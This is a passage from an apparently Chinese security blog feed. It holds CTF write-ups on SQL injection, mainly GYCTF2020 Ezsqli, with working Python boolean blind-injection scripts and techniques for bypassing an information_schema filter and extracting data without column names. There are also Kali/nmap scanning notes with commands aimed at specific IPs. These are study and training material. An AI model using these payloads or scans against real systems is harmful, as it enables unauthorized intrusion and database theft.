punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] flag (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>  i <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] flag:'</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题真的废了不少功夫来进行理解，主要还是基础太差了，对sqlite了解不足。但是收获还是很多的，其中的方法思想，对于其他的数据库同样适用，也是因为这个原因，我不断在mysql中测试这些方法，总归还是有些不同的，但是也找出合适的替代方式。之后有时间使用mysql搭建一下这个环境，又玩了一个坑，我得歇歇学java去了，它的代码github也有，可以在下面的链接查找。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a><br><a href="https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/sqlite_voting/server">https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/sqlite_voting/server</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Binary and Hexadecimal Number</title>
      <link href="/2021/09/24/binary-and-hexadecimal-number/"/>
      <url>/2021/09/24/binary-and-hexadecimal-number/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 计算机底层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制与16进制 </tag>
            
            <tag> 计算机组成 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload_CTF</title>
      <link href="/2021/09/22/upload-ctf/"/>
      <url>/2021/09/22/upload-ctf/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020Ezsqli</title>
      <link href="/2021/09/21/gyctf2020-ezsqli/"/>
      <url>/2021/09/21/gyctf2020-ezsqli/</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3><p>从名字我们就可以知道米姆的类型——sql注入。</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>我们尝试输入一些注入语句时，很明显的发现，它过滤一些关键词。</p><p>使用burpsuit进行测试。</p><p><img src="1.png"></p><p>可以看出information都被过滤，很明显联合注入和报错注入没戏了。</p><h3 id="思路发现"><a href="#思路发现" class="headerlink" title="思路发现"></a>思路发现</h3><p>我们输入1 &amp;&amp; 1=2 与 1 &amp;&amp; 1=1 结果明显不同。可以使用布尔盲注</p><p><img src="2.png"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="获得表名"><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h3><p>本部分主要参考<a href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsalphabet <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span>url <span class="token operator">=</span> <span class="token string">'http://31756a2c-3de8-45dd-acc4-c7c75de5f962.node4.buuoj.cn:81/'</span>sql <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) = \'&#123;&#125;\''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># ascii</span>                <span class="token comment"># '2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) = \'&#123;&#125;\''.format(target, i, ord(char))</span>                <span class="token comment"># '2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) = \'&#123;&#125;\''.format(sql,i,ord(char))</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span>payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">import requestsalphabet &#x3D; [&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;_&#39;,&#39;,&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]url &#x3D; &#39;http:&#x2F;&#x2F;7583cc1b-1c3d-4c3b-8378-34e327bed770.node4.buuoj.cn:81&#x2F;&#39;sql &#x3D; &#39;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&#39;result &#x3D; &#39;&#39;for i in range(1,50):    for char in range(32,126):        payload &#x3D; &#39;2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) &#x3D; \&#39;&#123;&#125;\&#39;&#39;.format(sql,i,char)    # ascii                # &#39;2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) &#x3D; \&#39;&#123;&#125;\&#39;&#39;.format(target, i, ord(char))                # &#39;2||ascii(substr((&#123;&#125;),&#123;&#125;,1)) &#x3D; \&#39;&#123;&#125;\&#39;&#39;.format(sql,i,ord(char))        data &#x3D; &#123;            &#39;id&#39;:payload        &#125;        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        print(chr(char))        if (&#39;Nu1L&#39; in r.text):            result +&#x3D; chr(char)            print(&#39;1&#39;+ result)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写这个脚本的问题，请求方式写为了get。</p><p>‘id’ 写成了 id</p><h3 id="获得数据"><a href="#获得数据" class="headerlink" title="获得数据"></a>获得数据</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://31756a2c-3de8-45dd-acc4-c7c75de5f962.node4.buuoj.cn:81/'</span>flag<span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">trans</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment"># 因为如果不添加，第二个字符后会在字符中出现多个0x导致结果不正确</span>    <span class="token keyword">return</span> res<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hexchar <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        hexchar <span class="token operator">=</span> trans<span class="token punctuation">(</span>flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'2||(1,&#123;&#125;)>(select * from f1ag_1s_h3r3_hhhhh)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>hexchar<span class="token punctuation">)</span>        <span class="token comment">#         '2||(1,&#123;&#125;)>(select * from f1ag_1s_h3r3_hhhhh)'.format(hexchar)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span>payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        t <span class="token operator">=</span> r<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><blockquote><p>(1,{})&gt;(select * from f1ag_1s_h3r3_hhhhh)</p></blockquote><p>这一语句的意思其实是，这个表中有两列，原因可以自己输入，1、1,2、1,2,3进行测试。然后我们｛｝中的内容与查询结果进行对比，由此进行布尔盲注，获得字符值，至于字符串的比较原则，我们只能使用&gt;而非=进行测试。同时因为使用的为&gt;所以需要在后面的flag+=chr（char-1）进行减1操作</p><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>我们在上面的脚本中用此库代替information_schema，我们首先需要知道它是干什么的。</p><p>本部分主要参考<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><blockquote><p>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p></blockquote><p>​在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。比如columns表，和tables表</p><p><img src="3.png"></p><h3 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h3><blockquote><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和&gt; &gt; information_schema两个库，本身数据库不存储数据。简单的说就是视图。</p></blockquote><h4 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h4><p>开始了解这个视图之前，希望你可以想一下当你利用Mysql设计数据库时，是否会给每个表加一个自增的id（或其他名字）字段呢？如果是，那么我们发现了一个注入中在mysql默认情况下就可以替代information_schema库的方法。</p><blockquote><p>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。</p></blockquote><p><img src="4.png"></p><p>我们可以看到里面包含，数据库名，表名以及列名完美代替information_schema库</p><p>当然了，如果你说我们就是想想通过注入获取到没有自增主键的表的数据怎么办？通过翻阅sys中的视图文档，我又发现了一个视图也许可以实现这种需求？。</p><h4 id="schema-table-statistics-with-buffer-x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer-x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</h4><blockquote><p>查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间，即也可以理解为是存在最多表I/O争用的表）降序排序，数据来源：performance_schema.table_io_waits_summary_by_table、sys.x$ps_schema_table_statistics_io、sys.x$innodb_buffer_stats_by_table</p></blockquote><p><img src="5.png" alt="schema_table_statistics_with_buffer"></p><p><img src="6.png" alt="x$schema_table_statistics_with_buffer"></p><p>很明显我们可以通过这个视图得到，数据库名和表名</p><p>这个库的视图中还包括很多信息，如用户，数据库地址等，有兴趣可以自己去翻一下。</p><h2 id="Bypass-information-schema（无列名查找）"><a href="#Bypass-information-schema（无列名查找）" class="headerlink" title="Bypass information_schema（无列名查找）"></a>Bypass information_schema（无列名查找）</h2><p>但是我们还有一个问题，列名怎么办呢。可以使用无列名查找</p><h3 id="联合查询，Join"><a href="#联合查询，Join" class="headerlink" title="联合查询，Join"></a>联合查询，Join</h3><p>一般我们查询时会使用下面语句</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM sys.schema_table_statistics_with_buffer;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="7.png"></p><p>我们可以得到列名以及内容。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1,2,3 FROM sys.schema_table_statistics_with_buffer;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用上述语句时，查询结果为</p><p><img src="8.png"></p><p>对上述语句使用联合查询与join</p><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>本部分内容主要参考<a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1,2,3 FROM sys.schema_table_statistics_with_buffer union SELECT table_schema,table_name,rows_fetched FROM sys.schema_table_statistics_with_buffer ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="9.png"></p><p>我们可以看出得出虚拟表的列名以联合查询的前半部分为准。那么我们完全可以通过这一点来对虚拟表进行查询。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT &#96;1&#96; FROM (SELECT 1,2,3 FROM sys.schema_table_statistics_with_buffer union SELECT table_schema,table_name,rows_fetched FROM sys.schema_table_statistics_with_buffer )a;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="10.png"></p><p>同时我们可以查询多列</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT concat(&#96;1&#96;,0x7e,&#96;3&#96;) FROM (SELECT 1,2,3 FROM sys.schema_table_statistics_with_buffer union SELECT table_schema,table_name,rows_fetched FROM sys.schema_table_statistics_with_buffer )a;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们不仅可以命名为数字还可以为字母如</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT concat(e,0x7e,d) FROM (SELECT 1 as e ,2,3 as d FROM sys.schema_table_statistics_with_buffer union SELECT table_schema,table_name,rows_fetched FROM sys.schema_table_statistics_with_buffer )a;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>join无列表查询网上有很多，但是很多都只讲了payload而没有讲原理，我也是废了一些功夫才搞懂。</p><p>首先mysql中的join其实就是inner join 内联连接，即取两表中数据的交集。</p><p>using(a,b) 相当于 on t1.a = t2.b，即连接的标准，将表1a列与表2b列数据相同的行查询出来。</p><p>那么，我们如何得出列名呢？我们看一下下面的语句以及结果你就明白了。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM users as a INNER JOIN users as b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="11.png"></p><p>我们可以看到这个虚拟表是有重复的列名的，因而如果查询这个表的话，就会报错</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM(SELECT * FROM users as a INNER JOIN users as b)c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="12.png"></p><p>如果我们使用using呢？</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM users as a INNER JOIN users as b using (id);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="13.png"></p><p>可以看到id列名只有一个了，此时再查询这个表，我们就可以通过报错获得下一个列名。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM(SELECT * FROM users as a INNER JOIN users as b using (id))a;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="14.png"></p><p>我们便可以通过这个方式不断添加using()中的值，比如using(id,username)，不断获得列名。</p><p>知道了列名，查询就容易了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali使用</title>
      <link href="/2021/09/13/kali-shi-yong/"/>
      <url>/2021/09/13/kali-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><p>信息搜集 -&gt; 存在漏洞 -&gt; 攻击<br>        -&gt; 不存在漏洞 -&gt; 漏洞挖掘 -&gt; 存在漏洞 -&gt; 攻击 -&gt; 权限维持 -&gt; 内网渗透</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h3><ol><li>登陆入口</li><li>后台入口</li><li>数据库下载地址</li><li>网站目录结构</li><li>GIR/SVN泄露</li><li>代码泄露</li></ol><h4 id="怎么获得网站目录"><a href="#怎么获得网站目录" class="headerlink" title="怎么获得网站目录"></a>怎么获得网站目录</h4><ol><li>爬虫爬取</li><li>暴力扫描</li><li>搜索引擎</li><li>…….</li></ol><h4 id="IP-端口扫描"><a href="#IP-端口扫描" class="headerlink" title="IP/端口扫描"></a>IP/端口扫描</h4><ol><li>IP开放端口</li><li>域名,子域名</li><li>IP80</li></ol><h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><h3 id="扫描语法"><a href="#扫描语法" class="headerlink" title="扫描语法"></a>扫描语法</h3><h4 id="扫描步骤"><a href="#扫描步骤" class="headerlink" title="扫描步骤"></a>扫描步骤</h4><p>一般使用 -sS进行扫描(使用SYN进行扫描)</p><pre class="line-numbers language-none"><code class="language-none">nmap 123.50.77.33  -p 80 -sS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>知道端口，查看端口所代表的服务以及版本。</p><pre class="line-numbers language-none"><code class="language-none">nmap 47.111.119.22  -p 80 -sS -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">PORT   STATE SERVICE VERSION80&#x2F;tcp open  http    nginx 1.16.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后想要知道操作系统加 <strong>-O</strong></p><pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">Too many fingerprints match this host to give specific OS details<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果想要包括全部的知识，可以使用-A</p><h4 id="随机扫描"><a href="#随机扫描" class="headerlink" title="随机扫描"></a>随机扫描</h4><p>-iR随机扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -iR 2 -p 80 -sS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="扫描常见端口"><a href="#扫描常见端口" class="headerlink" title="扫描常见端口"></a>扫描常见端口</h4><pre class="line-numbers language-none"><code class="language-none">--top-ports num<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-结果" data-language="结果"><code class="language-结果">root@kali:&#x2F;home&#x2F;violet# nmap 210.216.31.29 --top-ports 5Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2021-09-16 10:45 CSTNmap scan report for 210.216.31.29Host is up (0.11s latency).PORT    STATE  SERVICE21&#x2F;tcp  closed ftp22&#x2F;tcp  closed ssh23&#x2F;tcp  closed telnet80&#x2F;tcp  closed http443&#x2F;tcp closed httpsNmap done: 1 IP address (1 host up) scanned in 0.63 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换扫描方式"><a href="#切换扫描方式" class="headerlink" title="切换扫描方式"></a>切换扫描方式</h4><pre class="line-numbers language-none"><code class="language-none">-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans -sU: UDP Scan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="输出形式"><a href="#输出形式" class="headerlink" title="输出形式"></a>输出形式</h4><pre class="line-numbers language-none"><code class="language-none">-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre class="line-numbers language-none"><code class="language-none">nmap url --script&#x3D;&quot;路径&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><pre class="line-numbers language-none"><code class="language-none">nmap 210.216.31.29 -n -T3 -sA -e eth0 -F <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>-n 取消DNS解析, -e指定网卡, -T3速度适宜, -F素的适宜</p><p>-Pn 认为它在网络.</p><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><pre class="line-numbers language-none"><code class="language-none">HOST DISCOVERY:&#x2F;&#x2F; 直接列出扫描目标，而不进行扫描-sL: List Scan - simply list targets to scan&#x2F;&#x2F; 因为TCP，所以肯定是要给端口的-PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: TCP SYN&#x2F;ACK, UDP or SCTP discovery to given ports<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="规避防火墙"><a href="#规避防火墙" class="headerlink" title="规避防火墙"></a>规避防火墙</h4><pre class="line-numbers language-none"><code 